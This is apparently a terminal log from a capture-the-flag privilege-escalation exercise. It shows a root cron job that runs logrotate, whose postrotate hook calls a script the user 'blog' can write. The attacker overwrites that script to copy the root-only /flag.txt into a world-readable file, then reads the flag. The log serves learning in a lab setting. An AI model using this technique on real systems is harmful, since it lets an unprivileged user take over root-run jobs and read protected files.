

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
*/10 * * * * root /usr/sbin/logrotate -f /etc/logrotate.d/app

$ ls -al /usr/sbin/logrotate
-rwxr-xr-x 1 root root 100520 Dec 14  2022 /usr/sbin/logrotate
$ cat /etc/logrotate.d/app
/var/log/app.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    postrotate
        /usr/local/bin/cleanup.sh
    endscript
}
$ ls -al /usr/local/bin/cleanup.sh
-rwxr-xr-x 1 blog blog 0 Aug 19 13:56 /usr/local/bin/cleanup.sh
$ cat /usr/local/bin/cleanup.sh
$ echo "cat /flag.txt > /tmp/x ; chmod 777 /tmp/x" > /usr/local/bin/cleanup.sh
$ cat /usr/local/bin/cleanup.sh
cat /flag.txt > /tmp/x ; chmod 777 /tmp/x
$ cd /tmp
$ ls -al
total 44
drwxrwxrwt 1 root root  4096 Sep 13 05:10 .
drwxr-xr-x 1 root root  4096 Sep 13 03:55 ..
-rw-r--r-- 1 blog blog     0 Sep 13 04:49 cluster.json
-rw-r--r-- 1 blog blog     0 Sep 13 04:52 clusters.json
-r--r--r-- 1 blog blog 29835 Sep 13 04:40 config.gz
-rwxrwxrwx 1 root root    70 Sep 13 05:10 x
$ cat /tmp/x
ctf{100e4e338e99fbcc300a001d8eb22388015aef102bf56904e2ea84afdacb78b0}